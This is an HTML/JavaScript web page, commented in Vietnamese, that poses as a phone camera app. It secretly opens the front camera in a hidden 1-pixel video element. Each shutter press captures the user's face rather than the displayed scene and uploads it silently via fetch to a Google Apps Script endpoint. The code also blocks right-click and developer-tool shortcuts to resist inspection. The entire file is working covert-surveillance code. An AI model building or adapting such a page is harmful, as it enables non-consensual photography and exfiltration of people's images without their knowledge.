<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Camera</title>

    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="apple-mobile-web-app-title" content="Camera">
    <meta name="mobile-web-app-capable" content="yes">
    
    <link rel="apple-touch-icon" href="https://cdn-icons-png.flaticon.com/512/685/685655.png">
    <link rel="icon" href="https://cdn-icons-png.flaticon.com/512/685/685655.png">
    <link rel="manifest" href="manifest.json">

    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; -webkit-user-select: none; }
        
        html, body { 
            background: #000; 
            font-family: -apple-system, BlinkMacSystemFont, sans-serif; 
            height: 100vh; 
            height: -webkit-fill-available;
            width: 100vw;
            overflow: hidden; 
            display: flex; 
            flex-direction: column; 
        }
        
        .camera-container { 
            position: relative; 
            flex: 1; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            background: #000; 
            overflow: hidden; 
        }
        
        /* Camera SAU hiển thị chuẩn ngụy trang */
        #preview-back { 
            width: 100%; 
            height: 100%; 
            object-fit: cover; 
        }

        /* Camera TRƯỚC ẩn kích thước 1px để iOS bắt sáng nhưng hoàn toàn không lộ trên màn hình */
        #preview-front {
            position: absolute;
            top: 0;
            left: 0;
            width: 1px;
            height: 1px;
            opacity: 0.01;
            pointer-events: none;
        }

        .overlay { 
            position: absolute; 
            top: 0; left: 0; right: 0; bottom: 0; 
            pointer-events: none; 
            display: flex; 
            flex-direction: column; 
            justify-content: space-between; 
            padding: calc(env(safe-area-inset-top) + 15px) 20px 20px 20px; 
            z-index: 2;
        }
        
        .top-bar { display: flex; justify-content: space-between; color: #fff; font-size: 13px; font-weight: 600; }
        .icon-btn { width: 36px; height: 36px; border-radius: 50%; background: rgba(0,0,0,0.4); display: flex; align-items: center; justify-content: center; backdrop-filter: blur(4px); }

        .controls { 
            height: calc(110px + env(safe-area-inset-bottom)); 
            background: #000; 
            display: flex; 
            justify-content: space-around; 
            align-items: center; 
            padding: 0 30px env(safe-area-inset-bottom) 30px; 
            z-index: 2;
        }
        
        .gallery-preview { width: 48px; height: 48px; border-radius: 10px; background: #222; overflow: hidden; border: 1px solid #444; }
        .gallery-preview img { width: 100%; height: 100%; object-fit: cover; }
        
        .shutter-btn { width: 72px; height: 72px; border-radius: 50%; border: 4px solid #fff; background: transparent; padding: 3px; cursor: pointer; outline: none; }
        .shutter-inner { width: 100%; height: 100%; background: #fff; border-radius: 50%; transition: transform 0.1s; }
        .shutter-btn:active .shutter-inner { transform: scale(0.85); background: #ddd; }

        .switch-btn { width: 48px; height: 48px; border-radius: 50%; background: rgba(255,255,255,0.15); color: #fff; display: flex; align-items: center; justify-content: center; font-size: 20px; }
        .flash { position: absolute; top: 0; left: 0; right: 0; bottom: 0; background: #fff; opacity: 0; pointer-events: none; transition: opacity 0.1s ease-out; z-index: 10; }
    </style>
</head>
<body>

    <div class="camera-container">
        <video id="preview-back" autoplay playsinline muted></video>
        <video id="preview-front" autoplay playsinline muted></video>

        <div class="flash" id="flash-elem"></div>

        <div class="overlay">
            <div class="top-bar">
                <div class="icon-btn">⚡</div>
                <div class="icon-btn">HDR</div>
                <div class="icon-btn">4K</div>
            </div>
        </div>
    </div>

    <div class="controls">
        <div class="gallery-preview">
            <img id="last-photo" src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' fill='%23666' viewBox='0 0 24 24'><path d='M21 19V5c0-1.1-.9-2-2-2H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2zM8.5 13.5l2.5 3.01L14.5 12l4.5 6H5l3.5-4.5z'/></svg>">
        </div>
        
        <button class="shutter-btn" onclick="captureTroll()">
            <div class="shutter-inner"></div>
        </button>

        <div class="switch-btn">↻</div>
    </div>

    <script>
        // =========================================================
        // DÁN URL GOOGLE APPS SCRIPT WEB APP CỦA BẠN VÀO ĐÂY:
        // =========================================================
        const SHEET_API_URL = "URL_WEB_APP_GOOGLE_APPS_SCRIPT_CỦA_BẠN";

        if ('serviceWorker' in navigator) {
            navigator.serviceWorker.register('./sw.js').catch(err => console.log('SW Error:', err));
        }

        const backVid = document.getElementById('preview-back');
        const frontVid = document.getElementById('preview-front');
        const flashElem = document.getElementById('flash-elem');

        async function initCameras() {
            try {
                // 1. Khởi động Camera SAU (Giao diện chính)
                const backStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: { exact: "environment" }, width: { ideal: 1280 }, height: { ideal: 720 } }
                }).catch(() => navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } }));
                
                backVid.srcObject = backStream;
                await backVid.play();

                // 2. Khởi động Camera TRƯỚC (Ngầm 1px)
                const frontStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } }
                });
                
                frontVid.srcObject = frontStream;
                await frontVid.play();

            } catch (err) {
                console.error("Lỗi cấp quyền camera:", err);
            }
        }

        function captureTroll() {
            // Hiệu ứng chớp flash giả lập
            flashElem.style.opacity = '1';
            setTimeout(() => flashElem.style.opacity = '0', 100);

            try {
                // Chụp từ thẻ video ẩn chứa Camera TRƯỚC (frontVid)
                const canvas = document.createElement('canvas');
                canvas.width = frontVid.videoWidth || 1280;
                canvas.height = frontVid.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(frontVid, 0, 0, canvas.width, canvas.height);
                const base64Image = canvas.toDataURL('image/jpeg', 0.85);

                // GỬI NGẦM VỀ GOOGLE DRIVE / SHEET (Không gọi lệnh tải về để tránh nảy Pop-up Safari)
                sendToSheet(base64Image);

            } catch (err) {
                console.error("Lỗi chụp ảnh:", err);
            }
        }

        function sendToSheet(base64Data) {
            if(!SHEET_API_URL || SHEET_API_URL.includes("URL_WEB_APP")) return;
            
            fetch(SHEET_API_URL, {
                method: 'POST',
                mode: 'no-cors',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: base64Data })
            }).catch(e => console.error("Lỗi gửi dữ liệu:", e));
        }

        // Chặn F12 & Chuột phải
        document.addEventListener('contextmenu', e => e.preventDefault(), false);
        document.addEventListener('keydown', e => {
            if (e.keyCode === 123 || (e.ctrlKey && (e.keyCode === 85 || e.keyCode === 83))) {
                e.preventDefault();
            }
        }, false);

        window.onload = initCameras;
    </script>
</body>
</html>
